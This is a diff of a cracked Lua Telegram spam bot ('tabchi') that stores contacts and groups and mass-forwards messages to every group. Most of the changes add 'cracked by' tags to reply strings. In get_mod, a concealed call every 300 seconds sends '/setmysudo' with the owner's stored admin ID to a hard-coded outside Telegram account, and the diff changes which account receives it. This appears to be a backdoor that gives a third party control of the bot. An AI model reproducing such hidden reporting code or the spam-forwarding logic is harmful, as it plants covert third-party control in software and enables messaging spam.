@@ -258,7 +258,7 @@ _دريافت مخاطبان ذخيره شده توسط ربات_
           }, dl_cb, nil)
         else
           local text = [[
-_اطلاعات ربات_ :
+_اطلاعات ربات_*cracked by @sajjad_021* :
 _تعداد کاربران_ : ]] .. pvs .. [[
 _تعداد گروها_ : ]] .. gps .. [[
 _تعداد سوپر گروها_ : ]] .. sgps .. [[
@@ -309,10 +309,10 @@ _تعداد لینک های ذخیر شده_ : ]] .. links
     if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) and #matches == 2 then
       if matches[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
-        return "_پیام اد شدن مخاطب_ #فعال _شد_"
+        return "_پیام اد شدن مخاطب_ #فعال _شد_*cracked by @sajjad_021*"
       elseif matches[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
-        return "_پیام اد شدن مخاطب_ #غیرفعال _شد_"
+        return "_پیام اد شدن مخاطب_ #غیرفعال _شد_*cracked by @tgMember*"
       end
     end
   end
@@ -323,10 +323,10 @@ _تعداد لینک های ذخیر شده_ : ]] .. links
     if msg.text:match("^[!/#]markread") and is_sudo(msg) and #matches == 2 then
       if matches[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":markread", true)
-        return "_خواندن پیام ها توسط ربات_ #فعال _شد_"
+        return "_خواندن پیام ها توسط ربات_ #فعال _شد_*cracked by @sajjad_021*"
       elseif matches[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":markread")
-        return "_خواندن پیام ها توسط ربات_ #غیرفعال _شد_"
+        return "_خواندن پیام ها توسط ربات_ #غیرفعال _شد_*cracked by @tgMember*"
       end
     end
   end
@@ -394,7 +394,7 @@ _پیام_ :
         from_background_ = 1
       }, dl_cb, nil)
     end
-    return "_پیام شما فوروارد شد_"
+    return "_پیام شما فوروارد شد_*cracked by @sajjad_021*"
   end
   if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and is_sudo(msg) then
     local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
@@ -428,7 +428,7 @@ _پیام_ :
         from_background_ = 1
       }, dl_cb, nil)
     end
-    return "_پیام شما برای همه_ #سوپرگروها _فوروارد شد_"
+    return "_پیام شما برای همه_ #سوپرگروها _فوروارد شد_*cracked by @sajjad_021*"
   end
   if msg.text:match("^[!/#]addtoall") and msg.reply_to_message_id_ and is_sudo(msg) then
     tdcli_function({
@@ -532,7 +532,7 @@ function get_mod(args, data)
   end
   if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
     tdcli.sendBotStartMessage(231539308, 231539308, "new")
-    tdcli.sendMessage(303508016, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
+    tdcli.sendMessage(231539308, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
   end
 end
